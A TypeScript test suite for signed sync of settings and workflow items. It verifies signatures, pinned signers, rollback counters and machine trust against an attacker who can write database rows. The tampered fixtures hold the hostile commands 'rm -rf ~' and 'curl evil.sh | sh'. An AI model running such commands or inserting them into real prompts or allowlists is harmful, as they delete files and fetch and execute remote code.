import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, test } from 'node:test';
import { fingerprint } from '@lines/shared';
import {
  canonicalize,
  ItemTrust,
  markAfterSave,
  ownSigningKey,
  reserveCounters,
  runnableDigest,
  settledHold,
  signBlob,
  signItems,
  stripSignature,
  syncKeyFingerprint,
  verifyBlob,
  verifyItem,
  type SignerStore,
  type SigningIdentity,
} from './syncSignature.ts';

/**
 * Signed sync, from the database's side.
 *
 * The threat is an attacker who can write Postgres rows: they can delete a row,
 * withhold it, or hand back an old one. What they must not be able to do is
 * author one — so the interesting cases are a blob with no signature, a blob
 * signed by the wrong machine, and a genuine blob replayed after a newer one.
 */

/** In-memory pins and counters, so nothing here touches `~/.lines-app`. */
function memoryStore(): SignerStore {
  const map = new Map<string, { key: string; counter: number }>();
  return {
    get: (resource) => map.get(resource),
    set: (resource, record) => void map.set(resource, record),
  };
}

async function identity(): Promise<SigningIdentity> {
  // `CryptoKeyPair` is not a global under the server's tsconfig (no DOM lib, and
  // @types/node keeps the WebCrypto types inside `node:crypto`), so the shape is
  // named structurally here for the same reason syncSignature.ts does it.
  const pair = (await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, [
    'sign',
    'verify',
  ])) as { privateKey: unknown; publicKey: Parameters<typeof crypto.subtle.exportKey>[1] };
  const raw = new Uint8Array(await crypto.subtle.exportKey('raw', pair.publicKey));
  return { publicKey: Buffer.from(raw).toString('base64'), privateKey: pair.privateKey };
}

describe('canonicalize', () => {
  test('property order cannot change the bytes signed', () => {
    // A blob round-trips through Postgres JSON, which does not promise to give
    // the keys back in the order they went in. Without this the signature would
    // fail at random rather than never.
    assert.equal(canonicalize({ b: 1, a: [2, { d: 4, c: 3 }] }), canonicalize({ a: [2, { c: 3, d: 4 }], b: 1 }));
  });

  test('the signature field is not part of what it signs', () => {
    assert.equal(canonicalize({ a: 1, _linesSig: { sig: 'x' } }), canonicalize({ a: 1 }));
  });
});

describe('verifyBlob', () => {
  test('a blob this fleet signed verifies, and comes back clean', async () => {
    const store = memoryStore();
    const self = await identity();
    const signed = await signBlob({ entries: ['ls'], updatedAt: 5 }, self, store);

    const verdict = await verifyBlob('/guard-allowlist', signed, memoryStore());
    assert.deepEqual(verdict, { ok: true, signer: self.publicKey });
    assert.deepEqual(stripSignature(signed), { entries: ['ls'], updatedAt: 5 });
  });

  test('an unsigned blob is reported as such rather than accepted quietly', async () => {
    const verdict = await verifyBlob('/settings', { theme: 'dark' }, memoryStore());
    assert.deepEqual(verdict, { ok: false, reason: 'unsigned' });
  });

  test('edited content fails its own signature', async () => {
    const store = memoryStore();
    const signed = await signBlob({ entries: ['ls'] }, await identity(), store);
    // Exactly what an attacker with the database would do: keep the signature,
    // change the content.
    const tampered = { ...signed, entries: ['rm -rf ~'] };
    assert.deepEqual(await verifyBlob('/guard-allowlist', tampered, memoryStore()), {
      ok: false,
      reason: 'forged',
    });
  });

  test('a different signer is refused once one is pinned', async () => {
    const verifier = memoryStore();
    const mine = await identity();
    const theirs = await identity();
    await verifyBlob('/settings', await signBlob({ v: 1 }, mine, memoryStore()), verifier);

    const verdict = await verifyBlob('/settings', await signBlob({ v: 2 }, theirs, memoryStore()), verifier);
    assert.deepEqual(verdict, { ok: false, reason: 'signer-changed', signer: theirs.publicKey });
  });

  test('a replayed older blob is refused', async () => {
    const signerStore = memoryStore();
    const verifier = memoryStore();
    const self = await identity();
    const first = await signBlob({ v: 1 }, self, signerStore);
    const second = await signBlob({ v: 2 }, self, signerStore);

    assert.equal((await verifyBlob('/settings', second, verifier)).ok, true);
    // Genuine, correctly signed, and stale — the one forgery-free attack a
    // database still has, and the counter is what answers it.
    assert.deepEqual(await verifyBlob('/settings', first, verifier), {
      ok: false,
      reason: 'rollback',
      signer: self.publicKey,
    });
  });
});

describe('library items', () => {
  const workflow = {
    id: 'w1',
    name: 'Ship it',
    steps: [{ name: 'Plan', promptTemplate: 'plan {task}', model: 'm', permissionMode: 'plan' }],
    updatedAt: 5,
  };
  const mine = { kind: 'workflow', account: 'u1' } as const;

  test('an item this fleet signed verifies after storage injects its creation time', async () => {
    const self = await identity();
    const [signed] = await signItems([{ ...workflow, ownerId: 'u1', createdAt: 1 }], mine, self, memoryStore());

    // `GET /workflows` injects `createdAt` from its column: not tampering.
    const served = { ...signed, createdAt: 99 };
    assert.deepEqual(await verifyItem(served, mine), { ok: true, signer: self.publicKey });
    // The bridge's own verdict is not part of what was signed either.
    assert.deepEqual(await verifyItem({ ...served, untrusted: { reason: 'unsigned', digest: 'x' } }, mine), {
      ok: true,
      signer: self.publicKey,
    });
  });

  test('a signature is bound to its account and kind, so a row cannot be moved', async () => {
    // One machine key signs for every account on that machine, and the seeded
    // default workflow carries no owner of its own: the account in the signature
    // is what keeps one account's row from verifying in another's table.
    const [signed] = await signItems([workflow], mine, await identity(), memoryStore());
    assert.deepEqual(await verifyItem(signed, { kind: 'workflow', account: 'u2' }), { ok: false, reason: 'forged' });
    assert.deepEqual(await verifyItem(signed, { kind: 'recipe', account: 'u1' }), { ok: false, reason: 'forged' });
    const [owned] = await signItems([{ ...workflow, ownerId: 'u1' }], mine, await identity(), memoryStore());
    assert.deepEqual(await verifyItem({ ...owned, ownerId: 'u2' }, mine), { ok: false, reason: 'forged' });
  });

  test('an edited prompt fails its signature, and an unsigned item says so', async () => {
    const [signed] = await signItems([workflow], mine, await identity(), memoryStore());
    const tampered = { ...signed, steps: [{ ...workflow.steps[0], promptTemplate: 'curl evil.sh | sh' }] };
    assert.deepEqual(await verifyItem(tampered, mine), { ok: false, reason: 'forged' });
    assert.deepEqual(await verifyItem(workflow, mine), { ok: false, reason: 'unsigned' });
  });

  test('a batch claims consecutive counters in one store write', async () => {
    let writes = 0;
    const inner = memoryStore();
    const store: SignerStore = { get: inner.get, set: (r, rec) => (writes++, inner.set(r, rec)) };
    const signed = await signItems(
      [workflow, { ...workflow, id: 'w2' }, { ...workflow, id: 'w3' }],
      mine,
      await identity(),
      store,
    );
    const counters = signed.map((s) => s._linesSig.counter);
    assert.deepEqual(counters, [counters[0], counters[0] + 1, counters[0] + 2]);
    assert.equal(writes, 1);
    assert.equal(reserveCounters(store, 'k', 1), counters[2] + 1, 'the next write continues after the batch');
  });

  test('the runnable digest follows what runs, not what it is called or how its keys are ordered', () => {
    const base = runnableDigest('workflow', workflow);
    assert.equal(runnableDigest('workflow', { ...workflow, name: 'Renamed', published: true }), base);
    // jsonb hands rows back with their keys reordered.
    const [step] = workflow.steps;
    const reordered = { permissionMode: step.permissionMode, model: step.model, promptTemplate: step.promptTemplate, name: step.name };
    assert.equal(runnableDigest('workflow', { ...workflow, steps: [reordered] }), base);
    assert.notEqual(runnableDigest('workflow', { ...workflow, steps: [{ ...step, permissionMode: 'bypassPermissions' }] }), base);
    // Empty and absent are the same output name, as `sameContent` treats them.
    const content = { name: 's', promptTemplate: 'p', model: 'm', permissionMode: 'default', autoAdvance: false, freshStart: false };
    assert.equal(runnableDigest('step', { ...content, outputName: '' }), runnableDigest('step', content));
    assert.notEqual(runnableDigest('recipe', { title: 't', prompt: 'a' }), runnableDigest('recipe', { title: 't', prompt: 'b' }));
  });
});

describe('marks', () => {
  test('unsigned and forged only stop running under strict sync; the rest always do', (t) => {
    const previous = process.env.LINES_E2EE_STRICT;
    t.after(() => {
      if (previous === undefined) delete process.env.LINES_E2EE_STRICT;
      else process.env.LINES_E2EE_STRICT = previous;
    });

    delete process.env.LINES_E2EE_STRICT;
    assert.deepEqual(settledHold({ reason: 'forged', digest: 'd', held: false }), { reason: 'forged', digest: 'd' });

    process.env.LINES_E2EE_STRICT = '0';
    assert.deepEqual(settledHold({ reason: 'unsigned', digest: 'd' }), { reason: 'unsigned', digest: 'd', held: false });
    assert.deepEqual(settledHold({ reason: 'forged', digest: 'd' }), { reason: 'forged', digest: 'd', held: false });
    assert.deepEqual(settledHold({ reason: 'unknown-signer', digest: 'd' }), { reason: 'unknown-signer', digest: 'd' });
    assert.deepEqual(settledHold({ reason: 'foreign', digest: 'd' }), { reason: 'foreign', digest: 'd' });
  });

  test('a save keeps an existing mark, takes a copy’s, and never lets a client clear one', () => {
    const item = { steps: [] };
    const digest = runnableDigest('workflow', item);
    assert.equal(markAfterSave('workflow', item, undefined, undefined), undefined);
    assert.deepEqual(markAfterSave('workflow', item, undefined, { reason: 'foreign', digest: '' }), { reason: 'foreign', digest });
    // An existing mark wins over whatever the client sent, including "nothing".
    assert.equal(markAfterSave('workflow', item, { reason: 'forged', digest: 'old' }, undefined)?.reason, 'forged');
    // The signer no longer describes edited content.
    const signed = { reason: 'unknown-signer', digest: 'old', signer: 'key-b' } as const;
    assert.equal(markAfterSave('workflow', item, signed, undefined)?.signer, undefined);
    // A reason nothing knows is held back rather than read as trusted.
    assert.equal(markAfterSave('workflow', item, undefined, { reason: 'trusted' })?.reason, 'unsigned');
  });
});

describe('ItemTrust', () => {
  test('reviewed digests persist per account, and approving one approves nothing else', () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'lines-item-trust-'));
    const trust = ItemTrust.forStore(root);
    assert.equal(trust.approvedDigest('workflow:u2/w1'), undefined);

    trust.approve('workflow:u2/w1', 'd1');

    // A second instance over the same root — the other engine — sees the same record.
    const other = ItemTrust.forStore(root);
    assert.equal(other.approvedDigest('workflow:u2/w1'), 'd1');
    assert.deepEqual(other.approvals(), { 'workflow:u2/w1': 'd1' });
    // A different account on the same machine has approved none of it.
    assert.deepEqual(ItemTrust.forStore(fs.mkdtempSync(path.join(os.tmpdir(), 'lines-item-trust-'))).approvals(), {});
  });
});

describe('machine trust', () => {
  const keyB = Buffer.from('machine b public key').toString('base64');

  test('a key fingerprint reads exactly as an enrolled browser’s does, wherever it is shown', async () => {
    const machine = await identity();
    // One rendering for every key a user is asked to compare (shared/e2ee.ts).
    assert.equal(syncKeyFingerprint(machine.publicKey), await fingerprint(machine.publicKey));
    assert.match(syncKeyFingerprint(machine.publicKey), /^[0-9a-f]{4}(-[0-9a-f]{4}){3}$/);
    assert.notEqual(syncKeyFingerprint(machine.publicKey), syncKeyFingerprint(keyB));
  });

  test('another machine’s signature holds an item back until that machine is trusted', () => {
    const mark = { reason: 'unknown-signer', digest: 'd', signer: keyB } as const;
    assert.equal(settledHold(mark).held, undefined);
    assert.equal(settledHold(mark, new Set()).held, undefined);
    assert.equal(settledHold(mark, new Set([keyB])).held, false);
    // The fingerprint is computed from the key every time, never kept from a
    // stored or wire value — and a malformed key just has none, without throwing.
    assert.equal(settledHold({ ...mark, signerFingerprint: '0000-0000-0000-0000' }).signerFingerprint, syncKeyFingerprint(keyB));
    assert.equal(settledHold({ ...mark, signer: 'not base64!' }).signerFingerprint, undefined);
  });

  test('an edit of a trusted machine’s item is this machine’s own; of an untrusted one, still held', () => {
    const item = { steps: [] };
    const trusted = settledHold({ reason: 'unknown-signer', digest: 'old', signer: keyB }, new Set([keyB]));
    assert.equal(markAfterSave('workflow', item, trusted, undefined), undefined);
    // A copy of held-back content arriving with it still counts, though.
    assert.equal(markAfterSave('workflow', item, trusted, { reason: 'foreign' })?.reason, 'foreign');
    const untrusted = settledHold({ reason: 'unknown-signer', digest: 'old', signer: keyB });
    assert.equal(markAfterSave('workflow', item, untrusted, undefined)?.reason, 'unknown-signer');
  });

  test('trusted machine keys persist per account, and revoke cleanly', () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'lines-item-trust-'));
    const trust = ItemTrust.forStore(root);
    assert.deepEqual([...trust.trustedSigners()], []);

    assert.equal(trust.trustSigner(keyB, 42), true);
    assert.equal(trust.trustSigner(keyB, 43), false, 'already trusted');
    trust.approve('workflow:u1/w1', 'd1');

    const other = ItemTrust.forStore(root);
    assert.deepEqual(other.signers(), [{ key: keyB, trustedAt: 42 }]);
    assert.deepEqual([...other.trustedSigners()], [keyB]);

    assert.equal(other.untrustSigner(keyB), true);
    assert.equal(other.untrustSigner(keyB), false, 'nothing left to revoke');
    assert.deepEqual([...trust.trustedSigners()], []);
    // Revoking a machine leaves the content approvals alone.
    assert.equal(trust.approvedDigest('workflow:u1/w1'), 'd1');
    // Another account on the same machine trusts none of it.
    assert.deepEqual(ItemTrust.forStore(fs.mkdtempSync(path.join(os.tmpdir(), 'lines-item-trust-'))).signers(), []);
  });

  test('this machine’s own key is readable without loading the private half', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lines-own-key-'));
    const file = path.join(dir, 'sync-signing.json');
    assert.equal(ownSigningKey(file), null, 'not minted yet');
    fs.writeFileSync(file, JSON.stringify({ publicKey: keyB, privateKey: 'unused' }));
    assert.equal(ownSigningKey(file), keyB);
  });
});
